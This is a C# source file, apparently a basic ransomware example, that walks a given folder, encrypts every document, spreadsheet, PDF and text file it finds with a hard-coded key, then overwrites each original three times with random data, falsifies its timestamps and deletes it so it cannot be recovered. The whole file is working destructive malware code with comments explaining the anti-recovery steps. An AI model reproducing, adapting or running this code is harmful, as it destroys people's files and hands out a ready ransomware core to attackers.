using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace Ransomware_Example
{
	class Ransomware_Example
	{
		public static void Main(string[] args)
        {
            try
            {
				string[] files = Directory.GetFiles(@args[0]);
				foreach (string fileName in files)
				{
					if (fileName.Contains(".doc") || fileName.Contains(".xls") || fileName.Contains(".xlsx") || fileName.Contains(".docx") || fileName.Contains(".pptx") ||  fileName.Contains(".ppt") || fileName.Contains(".pdf") || fileName.Contains(".txt"))
					{
						var InFileName = fileName;
						var OutFileName = InFileName + ".enc";
						Console.WriteLine("Encrypting " + InFileName);
						EncryptFile(InFileName, OutFileName);
						WipeFile(InFileName, 3);
					}
				}
                Console.WriteLine("Done");
            }
            catch (Exception e)
            {	
                Console.WriteLine(e);
            }
            Console.ReadLine();
        }

        // Encrypt a file.
		private static void EncryptFile(string inputFile, string outputFile)
		{
			string password = @"password"; // Your Key Here
			UnicodeEncoding UE = new UnicodeEncoding();
			byte[] key = UE.GetBytes(password);

			string cryptFile = outputFile;
			FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);

			RijndaelManaged RMCrypto = new RijndaelManaged();


			CryptoStream cs = new CryptoStream(fsCrypt,
				RMCrypto.CreateEncryptor(key, key),
				CryptoStreamMode.Write);

			FileStream fsIn = new FileStream(inputFile, FileMode.Open);

			int data;
			while ((data = fsIn.ReadByte()) != -1)
				cs.WriteByte((byte)data);
        
			fsIn.Close();
			cs.Close();
			fsCrypt.Close();
		}

		private static void WipeFile(string filename, int timesToWrite)
		{
			if (File.Exists(filename))
			{
				// Set the files attributes to normal in case it's read-only.
				File.SetAttributes(filename, FileAttributes.Normal);

				// Calculate the total number of sectors in the file.
				double sectors = Math.Ceiling(new FileInfo(filename).Length / 512.0);

				// Create a dummy-buffer the size of a sector.
				byte[] dummyBuffer = new byte[512];

				// Create a cryptographic Random Number Generator.
				// This is what I use to create the garbage data.
				RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();

				// Open a FileStream to the file.
				FileStream inputStream = new FileStream(filename, FileMode.Open);
				for (int currentPass = 0; currentPass < timesToWrite; currentPass++)
				{
					// Go to the beginning of the stream
					inputStream.Position = 0;

					// Loop all sectors
					for (int sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
					{
						// Fill the dummy-buffer with random data
						rng.GetBytes(dummyBuffer);

						// Write it to the stream
						inputStream.Write(dummyBuffer, 0, dummyBuffer.Length);
					}
				}

				// Truncate the file to 0 bytes.
				// This will hide the original file-length if you try to recover the file.
				inputStream.SetLength(0);

				// Close the stream.
				inputStream.Close();

				// As an extra precaution I change the dates of the file so the
				// original dates are hidden if you try to recover the file.
				DateTime dt = new DateTime(2037, 1, 1, 0, 0, 0);
				File.SetCreationTime(filename, dt);
				File.SetLastAccessTime(filename, dt);
				File.SetLastWriteTime(filename, dt);

				// Finally, delete the file
				File.Delete(filename);
			}
		}
    }
}